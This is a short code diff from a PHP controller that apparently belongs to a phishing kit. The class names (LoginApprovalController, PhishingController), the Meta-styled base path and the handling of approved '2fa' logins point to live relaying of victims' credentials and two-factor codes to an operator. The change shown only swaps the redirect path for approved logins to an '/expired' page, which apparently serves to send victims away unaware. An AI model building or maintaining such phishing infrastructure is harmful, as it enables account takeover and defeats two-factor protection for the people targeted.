@@ -74,7 +74,7 @@ class LoginApprovalController extends Controller
         ]);
 
         $sessionData = app(PhishingController::class)->getSessionData();
-        $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/1") : "/";
+        $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/expired") : "/";
 
         $id = (string) Str::uuid();
         $ip = $request->ip();
@@ -132,7 +132,7 @@ class LoginApprovalController extends Controller
         if (!$redirectUrl && $approval['status'] === 'approved') {
             $sessionData = app(PhishingController::class)->getSessionData();
             if ($type === '2fa') {
-                $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/1") : "/";
+                $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/expired") : "/";
             } else {
                 $redirectUrl = $sessionData['authPath'] ?? null;
             }
